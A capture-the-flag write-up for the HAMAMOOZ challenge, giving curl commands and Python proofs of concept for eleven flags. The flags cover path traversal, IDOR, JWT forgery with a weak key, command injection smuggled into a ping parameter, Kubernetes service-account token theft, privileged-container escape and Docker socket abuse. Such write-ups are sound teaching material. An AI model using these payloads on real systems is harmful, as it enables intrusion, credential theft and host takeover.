
---

```markdown
# HAMAMOOZ CTF - Complete Writeup

## Overview
This writeup documents the exploitation of 11 vulnerabilities in the HAMAMOOZ CTF challenge, including Docker layer leaks, API misconfigurations, IDOR, JWT forgery, command injection, and Kubernetes attacks. Each section describes the vulnerability, step-by-step extraction, and a reproducible PoC.

---

## Flag 1: Docker Layer Information Leak

**Vulnerability:**
Docker images are built in layers. When a file is copied into an image and later removed in a subsequent layer, the file remains in the earlier layer. This allows extraction of sensitive files from the image history.

**Extraction:**
1. Save the Docker image to a tar file:
   ```bash
   docker save hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend -o backend.tar
   ```
2. Extract the image layers:
   ```bash
   mkdir extracted layer
   tar -xf backend.tar -C extracted
   ```
3. Locate the layer containing the `.env.leaked` file (identified by its hash) and extract it:
   ```bash
   tar -xf extracted/blobs/sha256/8042ae393dc8b7301ef4f2544fad8f596e00d57db61ca968d11d2b3e2e49f586 -C layer
   ```
4. Read the `.env` file to retrieve the flag.

**PoC:**
```python
import subprocess, os, re
subprocess.run(["docker", "save", "hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend", "-o", "backend.tar"])
os.makedirs("extracted", exist_ok=True)
os.makedirs("layer", exist_ok=True)
subprocess.run(["tar", "-xf", "backend.tar", "-C", "extracted"])
subprocess.run(["tar", "-xf", "extracted/blobs/sha256/8042ae393dc8b7301ef4f2544fad8f596e00d57db61ca968d11d2b3e2e49f586", "-C", "layer"])
with open("layer/app/.env", "r") as f:
    print(re.search(r'HAMAMOOZ{[^}]+}', f.read()).group(0))
```

---

## Flag 2: Swagger UI Disclosure

**Vulnerability:**
The OpenAPI schema endpoint is publicly accessible and contains the flag in the description field.

**Extraction:**
1. Send a GET request to the schema endpoint:
   ```bash
   curl -s https://ctf.seoeh.ir/api/schema/
   ```
2. Extract the flag from the response using regex.

**PoC:**
```python
import requests, re
response = requests.get("https://ctf.seoeh.ir/api/schema/")
print(re.search(r'HAMAMOOZ{[^}]+}', response.text).group(0))
```

---

## Flag 3: Internal API Endpoint

**Vulnerability:**
The `/api/internal/flag` endpoint is protected by a debug header check. Setting `X-Debug-Mode: true` bypasses the protection.

**Extraction:**
1. Send a GET request to `/api/internal/flag` with the `X-Debug-Mode: true` header:
   ```bash
   curl -i https://ctf.seoeh.ir/api/internal/flag -H "X-Debug-Mode: true"
   ```
2. The flag is returned in the response body.

**PoC:**
```python
import requests, re
response = requests.get("https://ctf.seoeh.ir/api/internal/flag", headers={"X-Debug-Mode": "true"})
print(re.search(r'HAMAMOOZ{[^}]+}', response.text).group(0))
```

---

## Flag 4: Path Traversal

**Vulnerability:**
The `/api/reports/download` endpoint does not sanitize the `file` parameter, allowing directory traversal to read arbitrary files.

**Extraction:**
1. Send a GET request to `/api/reports/download` with `file=../../../../app/flag.txt`:
   ```bash
   curl -s "https://ctf.seoeh.ir/api/reports/download?file=../../../../app/flag.txt"
   ```
2. The flag file is returned in the response.

**PoC:**
```python
import requests, re
response = requests.get("https://ctf.seoeh.ir/api/reports/download", params={"file": "../../../../app/flag.txt"})
print(re.search(r'HAMAMOOZ{[^}]+}', response.text).group(0))
```

---

## Flag 5: Insecure Direct Object Reference (IDOR)

**Vulnerability:**
The `/api/orgs/{org_id}/reports/{report_id}` endpoint does not validate if the user has permission to access the specified organization's reports.

**Extraction:**
1. Authenticate with a valid JWT token.
2. Access `/api/orgs/2/reports/2`:
   ```bash
   curl -i https://ctf.seoeh.ir/api/orgs/2/reports/2
   ```
3. The flag is present in the `secret_note` field of the response.

**PoC:**
```python
import requests, re
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MCIsInVzZXJuYW1lIjoibmF6aWxhX3Rlc3RfMjAyNiIsIm9yZyI6IkFjbWUgQ29ycCIsInJvbGUiOiJ1c2VyIn0.WoPl_lT27LUKBSBJ0hbppn9rD7lEiuA4j-b2JDgLyz8"
response = requests.get("https://ctf.seoeh.ir/api/orgs/2/reports/2", headers={"Authorization": f"Bearer {TOKEN}"})
print(re.search(r'HAMAMOOZ{[^}]+}', response.text).group(0))
```

---

## Flag 6: JWT Forgery

**Vulnerability:**
The JWT signing key is weak (`changeme123`) and the algorithm is HS256, allowing token forgery. The `role` claim can be changed to `admin`.

**Extraction:**
1. Register a new user to obtain a valid token.
2. Decode the token to inspect the payload.
3. Forge a new token with `role: admin` signed with `changeme123`.
4. Access the admin dashboard:
   ```bash
   curl -H "Authorization: Bearer <ADMIN_TOKEN>" https://ctf.seoeh.ir/admin/dashboard
   ```
5. The flag is returned in the response.

**PoC:**
```python
import jwt, requests, re
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MCIsInVzZXJuYW1lIjoibmF6aWxhX3Rlc3RfMjAyNiIsIm9yZyI6IkFjbWUgQ29ycCIsInJvbGUiOiJ1c2VyIn0.WoPl_lT27LUKBSBJ0hbppn9rD7lEiuA4j-b2JDgLyz8"
payload = jwt.decode(TOKEN, options={"verify_signature": False})
payload["role"] = "admin"
admin_token = jwt.encode(payload, "changeme123", algorithm="HS256")
response = requests.get("https://ctf.seoeh.ir/admin/dashboard", headers={"Authorization": f"Bearer {admin_token}"})
print(re.search(r'HAMAMOOZ{[^}]+}', response.text).group(0))
```

---

## Flag 7: Command Injection

**Vulnerability:**
The `/api/diag/ping` endpoint passes the `host` parameter directly to a shell command without sanitization, allowing command injection.

**Extraction:**
1. Send a POST request to `/api/diag/ping` with a payload that injects a command to read the flag:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1;cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}'
   ```
2. The flag is returned in the `output` field of the JSON response.

**PoC:**
```python
import requests, re
response = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": "127.0.0.1;cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"})
data = response.json()
print(re.search(r'HAMAMOOZ{[^}]+}', data.get("output", "")).group(0))
```

---

## Flag 8: Kubernetes SSRF

**Vulnerability:**
Command injection allows execution of `kubectl` commands inside the Kubernetes cluster, enabling access to internal services.

**Extraction:**
1. Use command injection to execute `kubectl exec` on the admin panel pod:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1; kubectl exec -n internal-tools admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"}'
   ```
2. The flag is embedded in an HTML comment within the Python file.

**PoC:**
```python
import requests, re
response = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": "127.0.0.1; kubectl exec -n internal-tools admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"})
data = response.json()
print(re.search(r'HAMAMOOZ{[^}]+}', data.get("output", "")).group(0))
```

---

## Flag 9: Kubernetes Secret Exposure

**Vulnerability:**
The service account token mounted in the pod can be used to authenticate with the Kubernetes API and read secrets from other namespaces.

**Extraction:**
1. Use command injection to access the Kubernetes API with the service account token:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1;curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets"}'
   ```
2. Extract the base64-encoded flag from the secret and decode it.

**PoC:**
```python
import requests, re, base64
response = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": "127.0.0.1;curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets"})
data = response.json()
encoded = re.search(r'"flag":"([^"]+)"', data.get("output", "")).group(1)
decoded = base64.b64decode(encoded).decode('utf-8')
print(re.search(r'HAMAMOOZ{[^}]+}', decoded).group(0))
```

---

## Flag 10: Privileged Container Escape

**Vulnerability:**
The `legacy-worker` pod runs with `privileged: true` and mounts the host's root filesystem at `/host`, allowing escape to the host.

**Extraction:**
1. Use command injection to execute `kubectl exec` on the privileged pod and read the flag from the host filesystem:
   ```bash
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"}'
   ```
2. The flag is returned in the `output` field.

**PoC:**
```python
import requests, re
response = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"})
data = response.json()
print(re.search(r'HAMAMOOZ{[^}]+}', data.get("output", "")).group(0))
```

---

## Flag 11: Docker Socket Abuse

**Vulnerability:**
The privileged pod mounts the host's Docker socket at `/host/run/docker.sock`, allowing container creation with host mounts.

**Extraction:**
1. Use command injection to create a container with the host root mounted, read the flag file, and retrieve logs:
   ```bash
   # Create container
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/create -H \"Content-Type: application/json\" -d \"{\\\"Image\\\":\\\"hub.hamdocker.ir/alpine:3.19\\\",\\\"Cmd\\\":[\\\"sh\\\",\\\"-c\\\",\\\"cat /host/home/ubuntu/flag.txt\\\"],\\\"HostConfig\\\":{\\\"Binds\\\":[\\\"/:/host\\\"]}}\""}'
   # Start container
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/<CONTAINER_ID>/start"}'
   # Get logs
   curl -X POST https://ctf.seoeh.ir/api/diag/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock \"http://localhost/containers/<CONTAINER_ID>/logs?stdout=true&stderr=true\""}'
   ```

**PoC:**
```python
import requests, re
# Create container
r = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/create -H \"Content-Type: application/json\" -d \"{\\\"Image\\\":\\\"hub.hamdocker.ir/alpine:3.19\\\",\\\"Cmd\\\":[\\\"sh\\\",\\\"-c\\\",\\\"cat /host/home/ubuntu/flag.txt\\\"],\\\"HostConfig\\\":{\\\"Binds\\\":[\\\"/:/host\\\"]}}\""})
container_id = re.search(r'"Id":"([^"]+)"', r.json().get("output", "")).group(1)
# Start container
requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": f"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/{container_id}/start"})
# Get logs
r2 = requests.post("https://ctf.seoeh.ir/api/diag/ping", json={"host": f"127.0.0.1;kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock \"http://localhost/containers/{container_id}/logs?stdout=true&stderr=true\""})
print(re.search(r'HAMAMOOZ{[^}]+}', r2.json().get("output", "")).group(0))
```

---

## Tools Used
- Docker
- curl
- Python (requests, PyJWT, re, base64, subprocess)
- kubectl

## Summary
All 11 flags were successfully extracted using the techniques described above. The vulnerabilities range from misconfigurations and weak secrets to command injection and Kubernetes privilege escalation.
```